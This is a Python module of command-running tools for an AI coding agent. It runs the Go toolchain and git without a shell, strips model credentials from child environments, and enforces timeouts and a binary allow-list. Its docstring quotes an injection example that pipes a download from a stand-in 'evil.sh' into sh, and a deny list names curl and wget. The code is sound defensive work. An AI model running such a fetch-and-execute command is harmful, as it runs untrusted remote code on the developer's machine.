"""Command-running tools: the Go toolchain, git, and the guarded escape hatch.

Every process this module starts obeys three rules.

**No shell, ever.** ``argv`` lists, never strings. A shell would make quoting the
model's problem, and the model's quoting is a coin flip — one unescaped
``$(...)`` or backtick in a path and the difference between running a command and
running two is invisible until it matters. It also makes ``run_terminal``'s
allow-list meaningless, because ``go build; curl evil.sh | sh`` is one command as
far as a shell is concerned.

**A sanitised environment.** The child inherits the developer's environment
*minus* every model credential. In gateway deployment the key exists in the
process that spawns nothing; in local deployment it does not exist at all. But
"it should not be there" is not a control, and a subprocess that inherits an
environment inherits everything in it. Stripping is one line and closes the
category (Part A section 15.4, section 17).

**A timeout on everything.** ``go build`` on a cold module cache with a private
GitLab and no credentials does not fail — it *hangs*, waiting on a git prompt
that has nowhere to appear. That is the single most likely first-run experience
for a new developer, and without a timeout it presents as the agent being broken.
"""

from __future__ import annotations

import os
import shutil
import subprocess
from collections.abc import Sequence
from dataclasses import dataclass
from pathlib import Path

from dakcoder_shared.config import MODEL_CREDENTIAL_VARS
from dakcoder_shared.envelope import Mutation, MutationKind, ToolResult

from .router import Invocation

__all__ = ["HANDLERS", "Completed", "run"]

#: Binaries ``run_terminal`` may start, and why each is here. Anything not
#: listed is refused by name with the tool that does the job properly — the
#: allow-list is not a security boundary on its own (the agent runs as the
#: developer), it is a design boundary that keeps the model on tools whose
#: output the context manager knows how to cap.
ALLOWED_BINARIES: dict[str, str] = {
    "go": "the toolchain",
    "gofmt": "formatting",
    "goimports": "formatting",
    "git": "version control",
    "golangci-lint": "linting",
    "govulncheck": "vulnerability scanning",
    "govalid": "validator generation",
    "buf": "protobuf generation, for the connect variant",
    "swag": "swagger annotations",
}

#: Shell habits, and the tool that actually does the job. A refusal that names
#: the alternative saves a turn; a bare "not allowed" costs one.
_TERMINAL_ALTERNATIVES: dict[str, str] = {
    "grep": "search_repo",
    "rg": "search_repo",
    "findstr": "search_repo",
    "find": "search_repo",
    "ls": "repo_map",
    "dir": "repo_map",
    "cat": "read_file",
    "type": "read_file",
    "sed": "patch_file",
    "awk": "search_repo",
    "rm": "delete_file",
    "del": "delete_file",
    "cp": "write_file",
    "mv": "write_file (then delete_file)",
    "echo": "write_file",
    "make": "go_build",
    "docker": "nothing here — containers are the sandbox runner's business",
    "psql": "nothing here — the agent never touches a database",
    "curl": "nothing here — the agent does not make network calls",
    "wget": "nothing here — the agent does not make network calls",
}

DEFAULT_TIMEOUT = 120
#: Enough for the biggest gate stage measured (`go vet`, ~32 s) with headroom
#: for a cold cache, and short enough that a hang is reported rather than
#: waited out.
GATE_TIMEOUT = 300
MAX_CAPTURE = 400_000


@dataclass(frozen=True, slots=True)
class Completed:
    argv: tuple[str, ...]
    code: int
    output: str
    seconds: float
    timed_out: bool = False

    @property
    def ok(self) -> bool:
        return self.code == 0 and not self.timed_out


def child_env() -> dict[str, str]:
    """The environment a tool subprocess gets.

    Model credentials are removed rather than merely absent, so the guarantee
    holds even when something upstream sets one — a developer exporting
    ``OPENAI_API_KEY`` for an unrelated project must not silently hand it to a
    process the model chose the arguments for.

    ``GIT_TERMINAL_PROMPT=0`` turns the private-module hang into a fast, legible
    failure. Without it a missing GitLab credential blocks on a prompt no one can
    answer, and the agent looks broken rather than unconfigured.
    """
    env = dict(os.environ)
    for var in MODEL_CREDENTIAL_VARS:
        env.pop(var, None)
    env["GIT_TERMINAL_PROMPT"] = "0"
    env["GIT_ASKPASS"] = ""
    env["GOFLAGS"] = env.get("GOFLAGS", "")
    return env


def run(
    argv: Sequence[str],
    cwd: Path,
    *,
    timeout: int = DEFAULT_TIMEOUT,
) -> Completed:
    """Run one process. No shell, sanitised environment, hard timeout."""
    import time

    binary = shutil.which(argv[0])
    if binary is None:
        raise FileNotFoundError(argv[0])

    started = time.monotonic()
    try:
        proc = subprocess.run(  # noqa: S603 - argv list, shell=False, allow-listed
            [binary, *argv[1:]],
            cwd=cwd,
            env=child_env(),
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=timeout,
            check=False,
            shell=False,
        )
    except subprocess.TimeoutExpired as exc:
        partial = _join(exc.stdout, exc.stderr)
        return Completed(
            tuple(argv), 124, partial, time.monotonic() - started, timed_out=True
        )

    return Completed(
        tuple(argv),
        proc.returncode,
        _join(proc.stdout, proc.stderr),
        time.monotonic() - started,
    )


def _join(*streams: str | bytes | None) -> str:
    """Merge stdout and stderr into one signal.

    The Go toolchain writes diagnostics to stderr and results to stdout, and a
    build failure is both. Keeping them separate would mean every caller
    interleaving them again, in a slightly different order each time.
    """
    parts: list[str] = []
    for stream in streams:
        if not stream:
            continue
        text = stream.decode("utf-8", "replace") if isinstance(stream, bytes) else stream
        text = text.strip()
        if text:
            parts.append(text)
    joined = "\n".join(parts)
    if len(joined) > MAX_CAPTURE:
        joined = joined[:MAX_CAPTURE] + f"\n… output truncated at {MAX_CAPTURE:,} characters"
    return joined


def _result(done: Completed, *, what: str, fix_on_fail: str = "") -> ToolResult:
    if done.timed_out:
        return ToolResult.failure(
            f"{what} did not finish within {int(done.seconds)}s and was stopped.",
            fix="If this is the first run, the module cache may be fetching from "
            "gitlab.cept.gov.in. Check GOPRIVATE and git credentials before retrying.",
            meta={"argv": done.argv, "timeout": True},
        )
    body = done.output or f"{what}: clean"
    if done.ok:
        return ToolResult.success(body, meta={"argv": done.argv, "seconds": round(done.seconds, 2)})
    return ToolResult.failure(
        body,
        fix=fix_on_fail,
        meta={"argv": done.argv, "code": done.code, "seconds": round(done.seconds, 2)},
    )


# ── the Go toolchain ────────────────────────────────────────────────────────


def go_build(inv: Invocation) -> ToolResult:
    done = run(["go", "build", "./..."], inv.workspace.root, timeout=GATE_TIMEOUT)
    return _result(
        done,
        what="go build ./...",
        fix_on_fail="Fix the first error listed; later ones are often consequences of it.",
    )


def go_vet(inv: Invocation) -> ToolResult:
    done = run(["go", "vet", "./..."], inv.workspace.root, timeout=GATE_TIMEOUT)
    return _result(done, what="go vet ./...", fix_on_fail="Address each finding, then re-run.")


def go_test(inv: Invocation) -> ToolResult:
    argv = ["go", "test", inv.arg("pattern") or "./..."]
    if inv.arg("run"):
        argv += ["-run", inv.arg("run")]
    done = run(argv, inv.workspace.root, timeout=GATE_TIMEOUT)
    return _result(
        done,
        what="go test",
        fix_on_fail="Read the first FAIL block; pass run= to iterate on one test.",
    )


def gofmt(inv: Invocation) -> ToolResult:
    """Format files in place, then put their line endings back.

    Scoped to the files given, never the whole tree. Part A section 9.3 is
    explicit about why: every file in the reference template fails ``gofmt -l``
    because they all use CRLF, so an unscoped format touches files the agent
    never went near and buries the real change in a whole-repository diff.

    **And gofmt is why they fail it.** ``gofmt -w`` rewrites CRLF as LF —
    measured, not assumed: ``package p\\r\\n`` comes back ``package p\\n``. So
    scoping alone does not solve the problem the plan identified with it, it only
    shrinks it: the *touched* files, which are exactly the ones under review, come
    back with every line changed. That also silently undoes ``patch_file``'s line
    ending preservation one step later, which is worse than never having it —
    it looks correct in the unit test and fails in the repository.

    So each file's ending is captured before and restored after. gofmt keeps
    everything it is here for; it loses the one side effect nobody wanted.

    A file whose *only* change was the line ending is then byte-identical to what
    it was, and is not reported as a mutation. That matters more than it sounds:
    without the comparison, every gofmt run would mark every touched file as
    modified, and the mutation list the gate scopes itself to would grow to
    include files nothing happened to.
    """
    raw = inv.arg("paths") or ""
    paths = [p for p in raw.split(",") if p]
    if not paths:
        return ToolResult.success("gofmt: nothing to format")

    root = inv.workspace.root
    before: dict[str, bytes] = {}
    for rel in paths:
        try:
            before[rel] = (root / rel).read_bytes()
        except OSError:
            continue

    binary = "goimports" if shutil.which("goimports") else "gofmt"
    done = run([binary, "-l", "-w", *paths], root, timeout=DEFAULT_TIMEOUT)

    if not done.ok:
        # A syntax error stops formatting. Not a gate failure — go_build will
        # report it properly, with a line number and a message worth reading.
        #
        # Keyed off the exit code, not off whether anything was listed. gofmt
        # writes its diagnostics to stderr and its file list to stdout, and this
        # tool merges the two streams; treating an error line as a filename made
        # a file that does not parse come back as "already formatted", which is
        # the one answer that would stop the model looking any further.
        return ToolResult.success(
            f"{binary} could not format {', '.join(paths)} (it does not parse yet); "
            f"go_build will report the syntax error.\n{done.output}",
            meta={"binary": binary, "parse_error": True},
        )

    touched = [line.strip().replace("\\", "/") for line in done.output.split("\n") if line.strip()]

    changed: list[str] = []
    restored = 0
    for rel, original in before.items():
        path = root / rel
        try:
            current = path.read_bytes()
        except OSError:
            continue
        if b"\r\n" in original and b"\r\n" not in current:
            current = current.replace(b"\n", b"\r\n")
            path.write_bytes(current)
            restored += 1
        if current != original:
            changed.append(rel)

    if not changed:
        note = f"{binary}: already formatted"
        if restored:
            note += f" (line endings preserved in {restored} file(s))"
        return ToolResult.success(note, meta={"binary": binary, "eol_restored": restored})

    return ToolResult.success(
        f"{binary} reformatted {len(changed)} file(s): {', '.join(changed)}",
        mutations=[Mutation(p, MutationKind.MODIFY) for p in changed],
        meta={"binary": binary, "eol_restored": restored},
    )


def go_mod(inv: Invocation) -> ToolResult:
    op = inv.arg("op")
    root = inv.workspace.root

    if op == "tidy":
        before = _read_mod(root)
        done = run(["go", "mod", "tidy"], root, timeout=GATE_TIMEOUT)
        after = _read_mod(root)
        if not done.ok:
            return _result(
                done,
                what="go mod tidy",
                fix_on_fail="An import names a module that is not required. Check the "
                "import paths in the files you changed.",
            )
        if before != after:
            # Part A section 9.3: at the gate, tidy must be a no-op. A diff means
            # the dependency set drifted, which is a review decision, not a
            # formatting one.
            #
            # The change is reported line by line rather than as "go.mod
            # changed". The reference template's own go.mod requires api-db while
            # its code imports n-api-db, so the first gate on any service derived
            # from it lands here — and "go.mod drifted" would read as something
            # this run did, when it is a defect the service inherited. Naming the
            # modules lets the reader tell the two apart in one glance.
            return ToolResult.success(
                "go mod tidy changed go.mod:\n" + _mod_diff(before, after),
                mutations=[Mutation("go.mod", MutationKind.MODIFY)],
                meta={"changed": True},
            )
        return ToolResult.success("go mod tidy: no change", meta={"changed": False})

    if op == "why":
        pkg = inv.arg("pkg")
        if not pkg:
            return ToolResult.failure("go_mod why needs pkg.", fix="Pass the module path.")
        return _result(run(["go", "mod", "why", pkg], root), what=f"go mod why {pkg}")

    pkg = inv.arg("pkg")
    if not pkg:
        return ToolResult.failure("go_mod get needs pkg.", fix="Pass the module path to add.")
    target = f"{pkg}@{inv.arg('version')}" if inv.arg("version") else pkg
    done = run(["go", "get", target], root, timeout=GATE_TIMEOUT)
    if not done.ok:
        return _result(
            done,
            what=f"go get {target}",
            fix_on_fail="If this is a private module, GOPRIVATE and a git credential must "
            "be configured for gitlab.cept.gov.in.",
        )
    return ToolResult.success(
        done.output or f"added {target}",
        mutations=[
            Mutation("go.mod", MutationKind.MODIFY),
            Mutation("go.sum", MutationKind.MODIFY),
        ],
    )


def _mod_diff(before: str, after: str) -> str:
    """The require lines that moved, direct ones first.

    Only the direct requirements matter to a reader: an indirect that appears or
    disappears is a consequence of a direct one, and listing forty of them buries
    the one line that explains the change.
    """
    def requires(text: str) -> dict[str, str]:
        out: dict[str, str] = {}
        for line in text.split("\n"):
            stripped = line.strip()
            if not stripped or stripped.startswith(("//", "module ", "go ", "require (", ")")):
                continue
            parts = stripped.removeprefix("require ").split()
            if len(parts) >= 2 and "/" in parts[0]:
                out[parts[0]] = "indirect" if "// indirect" in stripped else "direct"
        return out

    was, now = requires(before), requires(after)
    lines: list[str] = []
    for module in sorted(set(was) | set(now)):
        old, new = was.get(module), now.get(module)
        if old == new:
            continue
        if old is None:
            lines.append(f"  + {module} ({new})")
        elif new is None:
            lines.append(f"  - {module} (was {old}, now unused)")
        else:
            lines.append(f"  ~ {module}: {old} -> {new}")

    direct = [line for line in lines if "indirect)" not in line]
    hidden = len(lines) - len(direct)
    if hidden:
        direct.append(f"  ... and {hidden} indirect requirement(s)")
    return "\n".join(direct) or "  (only formatting)"


def _read_mod(root: Path) -> str:
    try:
        return (root / "go.mod").read_text(encoding="utf-8")
    except OSError:
        return ""


def govalid_gen(inv: Invocation) -> ToolResult:
    """Regenerate the request validators.

    Run from ``handler/request/`` against ``request.go`` — the canonical DTO
    location (``package request``), which is where the migration SOP converges
    every service and where the generated files say they came from. Getting the
    working directory wrong here produces validators in the wrong package,
    which compiles far enough to be confusing.
    """
    handler = inv.workspace.root / "handler" / "request"
    if not handler.is_dir():
        return ToolResult.failure(
            "there is no handler/request/ directory, so there are no request DTOs "
            "to generate from.",
            fix="Check the working directory with repo_map.",
        )
    if not (handler / "request.go").is_file():
        return ToolResult.failure(
            "handler/request/request.go does not exist.",
            fix="Request DTOs live in handler/request/request.go (package request); "
            "create it before generating.",
        )

    if shutil.which("govalid") is None:
        # Stated plainly rather than passed over. A missing govalid means the
        # validators are NOT current, so a changed validate tag silently does
        # not fire — which presents as an endpoint accepting bad input, not as
        # a missing tool. Non-blocking because installing it is the Doctor's
        # job, but the consequence goes in the report either way.
        return ToolResult.success(
            "govalid is not installed, so request validators were NOT regenerated. "
            "If any validate tag changed in this run, validation will not reflect it. "
            "Install it with `go install gitlab.cept.gov.in/it-2.0-common/"
            "n-api-validation/cmd/govalid@latest`.",
            meta={"skipped": True},
        )

    before = _validator_snapshot(handler)
    done = run(["govalid", "./request.go"], handler, timeout=DEFAULT_TIMEOUT)
    after = _validator_snapshot(handler)

    if not done.ok and not after:
        return _result(
            done,
            what="govalid",
            fix_on_fail="Check the validate tags on the request structs for a typo.",
        )

    changed = sorted(
        f"handler/{name}" for name, digest in after.items() if before.get(name) != digest
    )
    if not changed:
        return ToolResult.success("govalid: validators already current")
    return ToolResult.success(
        f"govalid regenerated {len(changed)} validator(s): {', '.join(changed)}",
        mutations=[Mutation(p, MutationKind.MODIFY) for p in changed],
    )


def _validator_snapshot(handler: Path) -> dict[str, int]:
    out: dict[str, int] = {}
    for path in handler.glob("request_*_validator.go"):
        try:
            out[path.name] = hash(path.read_bytes())
        except OSError:
            continue
    return out


def golangci_lint(inv: Invocation) -> ToolResult:
    """Advisory only. Never fails the gate, whatever it finds.

    Part A section 9.2 puts Go idiom underneath the template rules deliberately.
    A style finding that blocks a correct, contract-compliant change is a tax on
    every task, and the one class that genuinely matters — duplicate ``package``
    declarations — is already a hard error in ``rules_lint``.
    """
    root = inv.workspace.root
    configured = any((root / name).exists() for name in (".golangci.yml", ".golangci.yaml"))
    if not configured:
        return ToolResult.success("golangci-lint: not configured for this repository; skipped")
    if shutil.which("golangci-lint") is None:
        return ToolResult.success("golangci-lint: not installed; skipped (advisory stage)")

    done = run(["golangci-lint", "run"], root, timeout=GATE_TIMEOUT)
    if done.ok:
        return ToolResult.success("golangci-lint: clean")
    return ToolResult.success(
        f"golangci-lint findings (advisory, not blocking):\n{done.output}",
        meta={"advisory": True, "code": done.code},
    )


def govulncheck(inv: Invocation) -> ToolResult:
    if shutil.which("govulncheck") is None:
        return ToolResult.success(
            "govulncheck: not installed; skipped. Install with "
            "`go install golang.org/x/vuln/cmd/govulncheck@latest` to enable this stage."
        )
    done = run(["govulncheck", "./..."], inv.workspace.root, timeout=GATE_TIMEOUT)
    return _result(
        done,
        what="govulncheck",
        fix_on_fail="Each finding names the affected symbol and the fixed version. "
        "Upgrading is a reviewed dependency change, not an in-task edit.",
    )


# ── version control ─────────────────────────────────────────────────────────


def git_status(inv: Invocation) -> ToolResult:
    done = run(["git", "status", "--porcelain=v1", "--branch"], inv.workspace.root, timeout=30)
    if not done.ok:
        return ToolResult.failure(
            done.output or "git status failed",
            fix="This directory may not be a git repository.",
        )
    return ToolResult.success(done.output or "working tree clean")


def _has_diff(output: str) -> bool:
    """Whether git emitted an actual diff, as opposed to only advice.

    ``diff --git`` opens every diff git produces, including a binary one, and
    none of git's advisory messages begin with it. Checked per line rather than
    with ``startswith`` on the whole blob because the advice comes first when
    both are present.
    """
    return any(line.startswith("diff --git") for line in output.splitlines())


def git_diff(inv: Invocation) -> ToolResult:
    argv = ["git", "diff"]
    if str(inv.arg("staged", "")).lower() in ("true", "1", "yes"):
        argv.append("--cached")
    if inv.arg("path"):
        argv += ["--", inv.arg("path")]
    done = run(argv, inv.workspace.root, timeout=60)

    # "No changes" said plainly, rather than left to be inferred from silence.
    #
    # ``run`` merges stdout and stderr, which is right for the Go toolchain and
    # wrong here: git writes the diff to stdout and its advice to stderr. On
    # Windows a file that differs only in line endings produces the CRLF warning
    # and no diff at all, so the merged output is one line of advice and
    # ``_result``'s empty-output fallback never fires -- it only catches output
    # that is empty, not output that is entirely advice.
    #
    # What the model then sees is a successful call whose result contains no
    # diff and no statement that there is none, which reads as a call that
    # malfunctioned. It reruns the identical call, the duplicate guard refuses
    # the second, and the third ends the run for no progress. That is a run lost
    # to a file with the wrong line endings.
    #
    # The advice is kept, labelled as advice, because a CRLF warning is worth
    # seeing once and worth never mistaking for a result.
    if done.ok and not _has_diff(done.output):
        where = f" in {inv.arg('path')}" if inv.arg("path") else ""
        staged = " staged" if "--cached" in argv else ""
        body = f"git diff: no{staged} changes{where}"
        if done.output:
            body += (
                "\n\ngit also wrote, which is advice rather than a result:\n"
                + done.output
            )
        return ToolResult.success(body, meta={"argv": done.argv, "empty": True})

    return _result(done, what="git diff")


def git_blame(inv: Invocation) -> ToolResult:
    argv = ["git", "blame", "--date=short", "-w"]
    start, end = inv.arg("start"), inv.arg("end")
    if start:
        argv += ["-L", f"{start},{end or start}"]
    argv += ["--", inv.path()]
    done = run(argv, inv.workspace.root, timeout=60)
    return _result(done, what="git blame")


def git_ops(inv: Invocation) -> ToolResult:
    """Stage, commit, or move to the session branch.

    There is no ``push``, no ``reset --hard`` and no ``rebase``, and that is a
    property of the tool rather than a policy in the prompt. Everything reachable
    from here is recoverable with ``git reflog``; nothing reachable from here is
    visible to anyone else until a human pushes it.
    """
    op = inv.arg("op")
    root = inv.workspace.root

    if op == "branch":
        name = inv.arg("message") or "agent/session"
        done = run(["git", "rev-parse", "--verify", name], root, timeout=30)
        argv = ["git", "checkout", name] if done.ok else ["git", "checkout", "-b", name]
        return _result(run(argv, root, timeout=30), what=f"git checkout {name}")

    if op == "add":
        raw = inv.arg("paths") or ""
        paths = [p for p in raw.split(",") if p]
        argv = ["git", "add", "--", *paths] if paths else ["git", "add", "-u"]
        return _result(run(argv, root, timeout=60), what="git add")

    if op == "commit":
        message = inv.arg("message")
        if not message:
            return ToolResult.failure(
                "a commit needs a message.",
                fix="Pass message describing the change in one line.",
            )
        done = run(["git", "commit", "-m", message], root, timeout=60)
        if not done.ok and "nothing to commit" in done.output:
            return ToolResult.success("nothing to commit; the working tree is clean")
        return _result(done, what="git commit")

    return ToolResult.failure(
        f"unknown git op {op!r}.", fix="op must be one of: branch, add, commit."
    )


# ── the escape hatch ────────────────────────────────────────────────────────


def run_terminal(inv: Invocation) -> ToolResult:
    """Run one allow-listed binary with explicit arguments."""
    import json

    raw = inv.arg("argv", "")
    try:
        argv = json.loads(raw) if isinstance(raw, str) else raw
    except json.JSONDecodeError:
        argv = raw.split() if isinstance(raw, str) else []

    if isinstance(argv, str):
        argv = argv.split()
    if not isinstance(argv, list) or not argv or not all(isinstance(a, str) for a in argv):
        return ToolResult.failure(
            "argv must be a JSON array of strings.",
            fix='For example: ["go", "env", "GOPRIVATE"]',
        )

    binary = Path(argv[0]).name.lower()
    binary = binary[:-4] if binary.endswith(".exe") else binary

    if binary not in ALLOWED_BINARIES:
        alternative = _TERMINAL_ALTERNATIVES.get(binary)
        fix = (
            f"Use {alternative}."
            if alternative
            else f"run_terminal allows: {', '.join(sorted(ALLOWED_BINARIES))}."
        )
        return ToolResult.failure(f"run_terminal will not run {argv[0]!r}.", fix=fix)

    for arg in argv[1:]:
        if any(ch in arg for ch in ";|&\n\r`") or "$(" in arg:
            return ToolResult.failure(
                f"argument {arg!r} contains shell metacharacters.",
                fix="There is no shell here, so they cannot do what you intend. "
                "Pass each argument separately.",
            )

    timeout = inv.arg("timeout") or 60
    done = run(argv, inv.workspace.root, timeout=timeout)
    return _result(done, what=" ".join(argv))


HANDLERS = {
    "go_build": go_build,
    "go_vet": go_vet,
    "go_test": go_test,
    "gofmt": gofmt,
    "go_mod": go_mod,
    "govalid_gen": govalid_gen,
    "golangci_lint": golangci_lint,
    "govulncheck": govulncheck,
    "git_status": git_status,
    "git_diff": git_diff,
    "git_blame": git_blame,
    "git_ops": git_ops,
    "run_terminal": run_terminal,
}
